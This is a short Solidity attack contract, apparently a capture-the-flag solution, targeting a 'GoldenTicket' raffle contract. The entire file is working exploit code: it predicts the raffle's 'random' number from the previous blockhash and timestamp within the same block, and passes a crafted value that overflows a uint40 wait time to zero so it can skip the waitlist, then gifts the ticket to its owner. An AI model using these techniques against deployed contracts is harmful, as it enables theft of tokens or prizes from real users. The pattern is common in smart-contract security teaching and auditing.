//SPDX-License-Identifier: UNLICESED

pragma solidity ^0.8.0;

import "./GoldenTicket.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract GoldenTicketAttack is Ownable{

    GoldenTicket goldenTicket;


    constructor(address _goldenTicket){
        goldenTicket = GoldenTicket(_goldenTicket);
    }


    //Find the random number to join the raffle
    function getRandomness()public view returns(uint){
        uint randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        return randomNumber;
    }


    //Find the right amount to pass, to set 0 as waitlist timing.
    function getTimingFor0()public view returns(uint){
        uint timeToUpdate = type(uint40).max - block.timestamp;
        return timeToUpdate;
    }



    function attack()public onlyOwner{
        goldenTicket.joinWaitlist();

        uint timeToAdd = getTimingFor0();
        goldenTicket.updateWaitTime(timeToAdd);
    }



    function getTicket()public onlyOwner{
        uint response = getRandomness();

        goldenTicket.joinRaffle(response);
        goldenTicket.giftTicket(owner());
    }

}